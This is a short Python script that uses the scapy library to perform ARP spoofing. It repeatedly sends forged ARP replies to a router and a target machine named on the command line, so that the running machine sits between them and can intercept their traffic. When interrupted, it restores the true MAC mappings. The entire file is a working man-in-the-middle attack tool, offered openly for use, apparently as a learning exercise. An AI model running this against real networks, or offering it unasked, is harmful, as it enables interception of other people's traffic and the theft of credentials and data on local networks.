import scapy.all as scapy
import sys

def restore_defaults(dest, source):
    # getting the real MACs
    target_mac = get_mac(dest)  # 1st (router), then (windows)
    source_mac = get_mac(source)
    # creating the packet
    packet = scapy.ARP(op=2, pdst=dest, hwdst=target_mac, psrc=source, hwsrc=source_mac)
    # sending the packet
    scapy.send(packet, verbose=False)

def get_mac(ip):
    # request that contain the IP destination of the target
    request = scapy.ARP(pdst=ip)
    # broadcast packet creation
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # concat packets
    final_packet = broadcast / request
    # getting the response
    answer = scapy.srp(final_packet, timeout=2, verbose=False)[0]
    # getting the MAC (its src because its a response)
    mac = answer[0][1].hwsrc
    return mac

# we will send the packet to the target by pretending being the spoofed
def spoofing(target, spoofed):
    # getting the MAC of the target
    mac = get_mac(target)
    # generating the spoofed packet modifying the source and the target
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
    # sending the packet
    scapy.send(packet, verbose=False)

def main():
    if len(sys.argv) != 3:
        print("Usage: python script.py <router_ip> <target_ip>")
        sys.exit(1)

    # Get the router IP and target IP from command line arguments
    router_ip = sys.argv[1]
    target_ip = sys.argv[2]

    try:
        while True:
            spoofing(router_ip, target_ip)  # router (source, dest -> attacker machine)
            spoofing(target_ip, router_ip)  # win PC
    except KeyboardInterrupt:
        print("[!] Process stopped. Restoring defaults .. please hold")
        restore_defaults(router_ip, target_ip)  # router (source, dest -> attacker machine)
        restore_defaults(target_ip, router_ip)  # win PC
        exit(0)

if __name__ == "__main__":
    main()
